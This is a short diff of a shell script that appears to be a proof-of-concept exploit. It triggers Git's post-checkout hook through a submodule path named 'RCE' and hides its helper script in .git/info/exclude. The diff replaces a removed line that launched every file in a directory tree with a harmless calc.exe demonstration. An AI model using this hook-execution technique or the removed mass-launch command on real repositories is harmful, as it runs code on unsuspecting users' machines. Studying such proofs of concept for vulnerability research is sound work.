@@ -6,9 +6,14 @@ export GIT_WORK_TREE="$PWD"
 echo 'git -C GITLNK/modules/RCE hook run post-checkout -- "$(git rev-parse HEAD)" "$(git rev-parse HEAD)" 1' >Call-Post-Checkout.sh
 touch .git/info/exclude
 grep -qxF 'Call-Post-Checkout.sh' .git/info/exclude||echo 'Call-Post-Checkout.sh' >>.git/info/exclude
+echo 'It works!' >Test.txt
+git add Test.txt
+git commit -m "test"
 CMD <<END
-for /r %i in (*.*) do (start "shit" "~dpnxi")
+start explorer "C:\Windows\System32\calc.exe"
+echo.It works!
 END
+sleep 1
 unset GIT_DIR
 unset GIT_WORK_TREE
 exit 0
